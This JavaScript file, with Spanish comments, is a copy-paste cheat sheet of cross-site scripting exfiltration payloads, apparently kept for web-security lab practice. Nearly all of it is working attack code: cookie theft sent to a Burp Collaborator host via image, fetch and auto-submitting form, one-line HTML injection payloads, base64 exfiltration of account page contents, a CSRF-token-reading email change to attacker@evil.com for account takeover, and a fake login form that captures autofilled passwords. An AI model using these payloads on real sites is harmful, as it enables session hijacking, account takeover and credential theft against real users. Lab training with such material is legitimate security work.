/* =============================================================================
 * XSS — Exploits rápidos de exfiltración
 * -----------------------------------------------------------------------------
 * Snippets JS para robar cookies / datos desde un XSS ya confirmado.
 * En TODOS, la URL de destino es la variable COLLAB (tu Burp Collaborator o
 * exploit server). Cambiá solo esa línea y copiá el vector que necesites.
 *
 *   Entry point: ../002-xss/README.md   ·   Cheat sheet: ../002-xss/cheat-sheet.md
 * ========================================================================== */

// 👉 CAMBIÁ ESTO por tu subdominio de Collaborator / exploit server:
const COLLAB = "https://BURP-COLLABORATOR-SUBDOMAIN";


/* ------------------------------------------------------------------ *
 * 1) IMG con la cookie concatenada en la URL
 *    - El más simple y discreto (no necesita CORS: una imagen carga cross-origin).
 *    - La request GET a COLLAB lleva la cookie en el query string.
 * ------------------------------------------------------------------ */
new Image().src = COLLAB + "/?c=" + encodeURIComponent(document.cookie);

// Variante equivalente creando el elemento a mano:
// const i = document.createElement("img");
// i.src = COLLAB + "/?c=" + encodeURIComponent(document.cookie);
// document.body.appendChild(i);


/* ------------------------------------------------------------------ *
 * 2) FETCH con la cookie
 *    - Útil si querés POST o mandar más datos. Con no-cors basta para exfiltrar.
 * ------------------------------------------------------------------ */
fetch(COLLAB + "/?c=" + encodeURIComponent(document.cookie), { mode: "no-cors" });

// POST (cuerpo con la cookie):
// fetch(COLLAB, { method: "POST", mode: "no-cors", body: document.cookie });


/* ------------------------------------------------------------------ *
 * 3) FORM que apunta a COLLAB con la cookie en la URL y se auto-envía
 *    - Sirve cuando querés una navegación real (o cuando fetch/img están limitados).
 * ------------------------------------------------------------------ */
const f = document.createElement("form");
f.method = "GET";
f.action = COLLAB;
const inp = document.createElement("input");
inp.name = "c";
inp.value = document.cookie;
f.appendChild(inp);
document.body.appendChild(f);
f.submit();


/* ============================================================================
 * BONUS — payloads listos para pegar en el reflejo/comentario
 * (COLLAB embebido; acordate de reemplazar el subdominio)
 * ========================================================================== */

/* IMG en una sola línea (contexto HTML):
 * <img src=x onerror="this.src='https://BURP-COLLABORATOR-SUBDOMAIN/?c='+document.cookie">
 *
 * SCRIPT robo de cookie:
 * <script>new Image().src='https://BURP-COLLABORATOR-SUBDOMAIN/?c='+document.cookie</script>
 *
 * SCRIPT exfiltrar /my-account (datos same-origin, base64):
 * <script>fetch('/my-account').then(r=>r.text()).then(t=>new Image().src='https://BURP-COLLABORATOR-SUBDOMAIN/?d='+btoa(t))</script>
 */


/* ------------------------------------------------------------------ *
 * 4) BONUS — Actuar en la sesión (cookie HttpOnly → no la robás, pero
 *    la usás): leer el CSRF token y forjar el cambio de email. Bypass CSRF.
 * ------------------------------------------------------------------ */
const ATTACKER_EMAIL = "attacker@evil.com"; // 👉 tu email
fetch("/my-account")
  .then((r) => r.text())
  .then((t) => {
    const token = t.match(/name="csrf" value="([^"]+)"/)[1];
    fetch("/my-account/change-email", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "csrf=" + token + "&email=" + encodeURIComponent(ATTACKER_EMAIL),
    });
  });


/* ------------------------------------------------------------------ *
 * 5) BONUS — Capturar credenciales (autofill del gestor de contraseñas)
 *    Pegar como HTML donde el admin cargue la página (stored):
 * ------------------------------------------------------------------ */
/*
<input name=username>
<input type=password name=password onchange="
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {method:'POST', mode:'no-cors',
    body: username.value + ':' + this.value})">
*/
